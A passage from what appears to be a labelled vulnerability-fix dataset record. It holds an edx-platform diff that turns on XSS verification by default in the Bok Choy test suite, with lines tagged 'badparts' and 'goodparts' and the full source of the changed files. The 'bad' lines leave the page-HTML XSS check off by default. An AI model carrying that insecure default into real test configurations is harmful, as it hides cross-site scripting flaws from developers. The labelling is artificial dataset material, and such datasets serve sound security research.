a/pavelib/utils/test/suites/bokchoy_suite.py\n+++ b/pavelib/utils/test/suites/bokchoy_suite.py\n@@ -58,7 +58,7 @@ def __init__(self, *args, **kwargs):\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n",
            "message": "",
            "files": {
                "/pavelib/paver_tests/test_paver_bok_choy_cmds.py": {
                    "changes": [
                        {
                            "diff": "\n     Paver Bok Choy Command test cases\n     \"\"\"\n \n-    def _expected_command(self, name, store=None, verify_xss=False):\n+    def _expected_command(self, name, store=None, verify_xss=True):\n         \"\"\"\n         Returns the command that is expected to be run for the given test spec\n         and store.\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py",
                            "badparts": [
                                "    def _expected_command(self, name, store=None, verify_xss=False):"
                            ],
                            "goodparts": [
                                "    def _expected_command(self, name, store=None, verify_xss=True):"
                            ]
                        },
                        {
                            "diff": "\n         self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n \n     def test_verify_xss_env_var(self):\n-        self.env_var_override.set('VERIFY_XSS', 'True')\n+        self.env_var_override.set('VERIFY_XSS', 'False')\n         with self.env_var_override:\n             suite = BokChoyTestSuite('')\n             name = 'tests'\n-            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n+            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n \n     def test_test_dir(self):\n         test_dir = 'foo'",
                            "add": 2,
                            "remove": 2,
                            "filename": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py",
                            "badparts": [
                                "        self.env_var_override.set('VERIFY_XSS', 'True')",
                                "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))"
                            ],
                            "goodparts": [
                                "        self.env_var_override.set('VERIFY_XSS', 'False')",
                                "            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))"
                            ]
                        }
                    ],
                    "source": "\n\"\"\" Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)), ]) ",
                    "sourceWithComments": "\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n"
                },
                "/pavelib/utils/test/suites/bokchoy_suite.py": {
                    "changes": [
                        {
                            "diff": "\n         self.default_store = kwargs.get('default_store', None)\n         self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n         self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n-        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n+        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n         self.extra_args = kwargs.get('extra_args', '')\n         self.har_dir = self.log_dir / 'hars'\n         self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/pavelib/utils/test/suites/bokchoy_suite.py",
                            "badparts": [
                                "        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))"
                            ],
                            "goodparts": [
                                "        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))"
                            ]
                        }
                    ],
                    "source": "\n\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return cmd_str ",
                    "sourceWithComments": "\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n         